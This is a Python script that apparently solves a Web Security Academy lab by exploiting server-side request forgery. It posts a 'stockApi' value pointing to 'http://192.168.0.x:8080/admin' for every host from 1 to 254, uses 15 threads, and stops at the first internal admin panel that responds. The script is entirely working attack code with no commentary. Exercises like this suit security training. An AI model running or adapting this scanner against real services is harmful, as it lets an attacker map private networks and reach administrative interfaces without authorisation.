import requests
import concurrent.futures
import threading
session = requests.Session()
url = "https://0a1300ae0349c7fc807c58870088003a.web-security-academy.net/product/stock"

flag = threading.Event()

def scan(url, i):
    if flag.is_set():
        return
    else:
        payload = {
            'stockApi': f"http://192.168.0.{i}:8080/admin"
        }
        response = session.post(url, payload)
        if response.status_code == 200:
            flag.set()
            print(f"[+] http://192.168.0.{i}/admin")
            return
        else:
            print(f'[-] Checked 192.168.0.{i} -> Status: {response.status_code}')
with concurrent.futures.ThreadPoolExecutor(max_workers=15) as executor:
    futures = []
    for i in range(1, 255):
        futures.append(executor.submit(scan, url, i))
    concurrent.futures.wait(futures)